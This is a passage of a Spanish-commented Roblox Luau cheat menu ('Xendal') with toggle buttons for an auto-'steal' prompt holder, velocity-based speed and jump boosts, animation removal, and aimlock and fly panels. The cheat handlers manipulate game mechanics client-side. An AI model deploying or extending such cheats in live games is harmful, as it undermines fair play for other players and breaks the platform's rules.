	local fpsFrame = screenGui:WaitForChild("XendalAimlock") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_cb);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Main Handler
local function C_cf()
local script = G2L["cf"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_cf);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Button.LocalScript
local function C_d6()
local script = G2L["d6"];
	local Players = game:GetService("Players")
	local ProximityPromptService = game:GetService("ProximityPromptService")
	local LocalPlayer = Players.LocalPlayer
	
	--= STEAL SYSTEM =--
	local currentPrompt = nil
	local holding = false
	local button = script.Parent  -- Suponemos que este script está dentro de un TextButton
	
	-- Función para verificar si el prompt es de "steal"
	local function esSteal(prompt)
		local texto = string.lower(prompt.ActionText or "")
		return string.find(texto, "steal") ~= nil
	end
	
	-- Bucle que mantiene presionado el prompt
	task.spawn(function()
		while true do
			task.wait(0.05)
			if holding and currentPrompt then
				currentPrompt:InputHoldBegin()
			end
		end
	end)
	
	-- Prompt aparece
	ProximityPromptService.PromptShown:Connect(function(prompt)
		if not esSteal(prompt) then return end
		if not holding then return end  -- Solo si el toggle está ON
		currentPrompt = prompt
	end)
	
	-- Prompt desaparece
	ProximityPromptService.PromptHidden:Connect(function(prompt)
		if prompt == currentPrompt then
			currentPrompt = nil
		end
	end)
	
	-- Toggle para activar/desactivar el Steal
	local isEnabled = false  -- Estado del toggle
	
	-- Función para actualizar el color del botón
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado
		end
	end
	
	-- Función para activar Steal
	local function startSteal()
		holding = true
		updateButtonAppearance()  -- Actualiza el color del botón
	end
	
	-- Función para desactivar Steal
	local function stopSteal()
		holding = false
		currentPrompt = nil
		updateButtonAppearance()  -- Actualiza el color del botón
	end
	
	-- Evento del botón para alternar el toggle
	button.MouseButton1Click:Connect(function()
		isEnabled = not isEnabled  -- Alternar el estado del toggle
	
		if isEnabled then
			startSteal()
		else
			stopSteal()
		end
	end)
	
	-- Actualizar el color del botón al inicio
	updateButtonAppearance()
	
end;
task.spawn(C_d6);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Main Handler
local function C_da()
local script = G2L["da"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_da);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Button.LocalScript
local function C_e1()
local script = G2L["e1"];
	local toggleButton = script.Parent  -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local flyFrame = screenGui:WaitForChild("XendalFly") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisibleFly = false -- Controla el estado de la visibilidad para Fly
	
	flyFrame.Visible = isVisibleFly
	
	-- Función para alternar la visibilidad del Frame de Fly
	local function toggleVisibilityFly()
		isVisibleFly = not isVisibleFly
		flyFrame.Visible = isVisibleFly -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisibleFly then
			toggleButton.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Azul cuando está visible (ON)
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está oculto (OFF)
		end
	
		-- Guardar el nuevo estado de visibilidad de Fly
		saveVisibilityConfigFly(isVisibleFly)
	end
	
	-- Inicializar el estado de color del botón según el estado cargado para Fly
	if isVisibleFly then
		toggleButton.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Azul cuando está visible
	else
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está oculto
	end
	
	-- Conectar el botón al toggle de visibilidad de Fly
	toggleButton.MouseButton1Click:Connect(toggleVisibilityFly)
	
end;
task.spawn(C_e1);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Main Handler
local function C_e5()
local script = G2L["e5"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(1) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_e5);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Main Handler
local function C_f3()
local script = G2L["f3"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_f3);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
local function C_fa()
local script = G2L["fa"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local Workspace = game:GetService("Workspace")
	
	local LocalPlayer = Players.LocalPlayer
	
	local running = false
	local conn
	
	-- Velocidades cuando WalkSpeed <= 30
	local SPEED_FORWARD  = 29
	local SPEED_LATERAL  = 28
	
	local SOUND_ID = ""
	
	-- UI
	local button = script.Parent
	local txtActivate
	local defaultColor
	
	-- Si el UI es TextBox
	if button and button:IsA("TextBox") then
		txtActivate = button
		defaultColor = txtActivate.BackgroundColor3
		button = nil
	end
	
	
	-- Función para reproducir sonido toggle
	local function playSound()
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
		if not hrp then return end
	
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end
	
	
	-- Toggle speed
	local function toggleSpeed()
		running = not running
		playSound()
	
		-- Cambia color del UI
		if txtActivate then
			txtActivate:ReleaseFocus()
			txtActivate.BackgroundColor3 = running and Color3.fromRGB(70,130,180) or defaultColor
		end
	
		if button then
			button.TextColor3 = running and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
		end
	
		-- desconectar si ya estaba activo
		if conn then
			conn:Disconnect()
			conn = nil
		end
	
		if running then
			conn = RunService.Heartbeat:Connect(function()
				local char = LocalPlayer.Character
				if not char then return end
	
				local hum = char:FindFirstChildOfClass("Humanoid")
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if not hum or not hrp then return end
	
				-- 🚫 Si WalkSpeed pasa de 30 NO aplica speed
				if hum.WalkSpeed > 30 then
					return
				end
	
				local dir = hum.MoveDirection
				if dir.Magnitude == 0 then return end
	
				local isSide =
					UserInputService:IsKeyDown(Enum.KeyCode.A)
					or UserInputService:IsKeyDown(Enum.KeyCode.Left)
					or UserInputService:IsKeyDown(Enum.KeyCode.D)
					or UserInputService:IsKeyDown(Enum.KeyCode.Right)
	
				if isSide then
					-- lateral speed
					hrp.AssemblyLinearVelocity = Vector3.new(
						dir.X * SPEED_LATERAL,
						hrp.AssemblyLinearVelocity.Y,
						dir.Z * SPEED_LATERAL
					)
				else
					-- forward speed
					hrp.AssemblyLinearVelocity = Vector3.new(
						dir.X * SPEED_FORWARD,
						hrp.AssemblyLinearVelocity.Y,
						dir.Z * SPEED_FORWARD
					)
				end
			end)
		end
	end
	
	
	-- ✅ Enter en TextBox
	if txtActivate then
		txtActivate.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				toggleSpeed()
			end
		end)
	end
	-- ✅ Click en UI Button
	if button then
		button.MouseButton1Click:Connect(toggleSpeed)
		button.TextColor3 = running and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
	end
	
end;
task.spawn(C_fa);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Main Handler
local function C_107()
local script = G2L["107"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
		
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
			
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
			
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
			
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_107);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
local function C_10e()
local script = G2L["10e"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local Workspace = game:GetService("Workspace")
	
	local LocalPlayer = Players.LocalPlayer
	
	local running = false
	local conn
	
	-- Velocidades cuando WalkSpeed <= 30
	local SPEED_FORWARD  = 28
	local SPEED_LATERAL  = 27
	
	local SOUND_ID = ""
	
	-- UI
	local button = script.Parent
	local txtActivate
	local defaultColor
	
	-- Si el UI es TextBox
	if button and button:IsA("TextBox") then
		txtActivate = button
		defaultColor = txtActivate.BackgroundColor3
		button = nil
	end
	
	
	-- Función para reproducir sonido toggle
	local function playSound()
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
		if not hrp then return end
	
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end
	
	
	-- Toggle speed
	local function toggleSpeed()
		running = not running
		playSound()
	
		-- Cambia color del UI
		if txtActivate then
			txtActivate:ReleaseFocus()
			txtActivate.BackgroundColor3 = running and Color3.fromRGB(70,130,180) or defaultColor
		end
	
		if button then
			button.TextColor3 = running and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
		end
	
		-- desconectar si ya estaba activo
		if conn then
			conn:Disconnect()
			conn = nil
		end
	
		if running then
			conn = RunService.Heartbeat:Connect(function()
				local char = LocalPlayer.Character
				if not char then return end
	
				local hum = char:FindFirstChildOfClass("Humanoid")
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if not hum or not hrp then return end
	
				-- 🚫 Si WalkSpeed pasa de 30 NO aplica speed
				if hum.WalkSpeed > 30 then
					return
				end
	
				local dir = hum.MoveDirection
				if dir.Magnitude == 0 then return end
	
				local isSide =
					UserInputService:IsKeyDown(Enum.KeyCode.A)
					or UserInputService:IsKeyDown(Enum.KeyCode.Left)
					or UserInputService:IsKeyDown(Enum.KeyCode.D)
					or UserInputService:IsKeyDown(Enum.KeyCode.Right)
	
				if isSide then
					-- lateral speed
					hrp.AssemblyLinearVelocity = Vector3.new(
						dir.X * SPEED_LATERAL,
						hrp.AssemblyLinearVelocity.Y,
						dir.Z * SPEED_LATERAL
					)
				else
					-- forward speed
					hrp.AssemblyLinearVelocity = Vector3.new(
						dir.X * SPEED_FORWARD,
						hrp.AssemblyLinearVelocity.Y,
						dir.Z * SPEED_FORWARD
					)
				end
			end)
		end
	end
	
	
	-- ✅ Enter en TextBox
	if txtActivate then
		txtActivate.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				toggleSpeed()
			end
		end)
	end
	-- ✅ Click en UI Button
	if button then
		button.MouseButton1Click:Connect(toggleSpeed)
		button.TextColor3 = running and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
	end
	
end;
task.spawn(C_10e);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Main Handler
local function C_13f()
local script = G2L["13f"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_13f);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Button.LocalScript
local function C_146()
local script = G2L["146"];
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	
	local player = Players.LocalPlayer
	
	-- CONFIG
	local jumpForce = 54
	local jumpBoostEnabled = false
	local SOUND_ID = ""
	
	local connections = {}
	local button = script.Parent
	if not button:IsA("TextButton") then button = nil end
	
	-- Limpieza de conexiones
	local function cleanupConnections()
		for _, c in ipairs(connections) do
			if c and c.Disconnect then
				pcall(function() c:Disconnect() end)
			end
		end
		connections = {}
	end
	
	-- Loop de salto
	local function applyJumpBoost(character)
		local hum = character:FindFirstChildWhichIsA("Humanoid")
		local rootPart = character:FindFirstChild("HumanoidRootPart")
		if not hum or not rootPart then return end
	
		local jumpedConn = hum.Jumping:Connect(function(active)
			if jumpBoostEnabled and active and rootPart then
				rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpForce, rootPart.Velocity.Z)
			end
		end)
		table.insert(connections, jumpedConn)
	end
	
	local function onCharacterAdded(character)
		cleanupConnections()
		character:WaitForChild("Humanoid")
		character:WaitForChild("HumanoidRootPart")
		applyJumpBoost(character)
	end
	
	player.CharacterAdded:Connect(onCharacterAdded)
	if player.Character and player.Character.Parent then
		onCharacterAdded(player.Character)
	end
	
	-- Sistema de sonido que no se corta
	local lastSound
	local function playSound()
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
		if not hrp then return end
	
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		lastSound = sound
		sound.Ended:Connect(function()
			if sound.Parent then sound:Destroy() end
		end)
	end
	
	-- Toggle salto
	local function toggleJumpBoost()
		jumpBoostEnabled = not jumpBoostEnabled
		playSound()
		if button then 
			button.TextColor3 = jumpBoostEnabled and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
		end
	end
	
	-- TextButton
	if button then
		button.MouseButton1Click:Connect(toggleJumpBoost)
		button.TextColor3 = jumpBoostEnabled and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
	end
	
end;
task.spawn(C_146);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Main Handler
local function C_14a()
local script = G2L["14a"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_14a);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Button.LocalScript
local function C_151()
local script = G2L["151"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent  -- Asegúrate de que este script esté dentro de un TextButton
	local character = player.Character or player.CharacterAdded:Wait()
	
	-- Variable para controlar si las animaciones deben ser eliminadas
	local isEnabled = false
	
	-- Función para eliminar todas las animaciones activas
	local function removeAllAnimations()
		-- Asegurarse de que el personaje tenga un humanoide
		local humanoid = character:WaitForChild("Humanoid")
	
		-- Eliminar todas las animaciones activas en el Animator
		local animator = humanoid:FindFirstChild("Animator")
		if animator then
			-- Detener todas las animaciones cargadas en el Animator
			for _, track in pairs(animator:GetPlayingAnimationTracks()) do
				track:Stop()
			end
		end
	end
	
	-- Función para actualizar el color del botón
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Verde cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado (original)
		end
	end
	
	-- Desactivar animaciones constantemente si está habilitado
	game:GetService("RunService").Heartbeat:Connect(function()
		if isEnabled and character and character:FindFirstChild("Humanoid") then
			removeAllAnimations()
		end
	end)
	
	-- Función Toggle para activar/desactivar el efecto
	local function toggleAnimations()
		isEnabled = not isEnabled  -- Alternar el estado de isEnabled
		updateButtonAppearance()  -- Actualizar el color del botón
	end
	
	-- Conectar el evento del botón
	button.MouseButton1Click:Connect(toggleAnimations)
	
	-- También en caso de que el personaje cambie
	player.CharacterAdded:Connect(function(newCharacter)
		character = newCharacter
		if isEnabled then  -- Si el toggle está activado, eliminar las animaciones
			removeAllAnimations()
		end
	end)
	
	-- Actualizar el color del botón al inicio
	updateButtonAppearance()
	
end;
task.spawn(C_151);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Main Handler
local function C_155()
local script = G2L["155"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
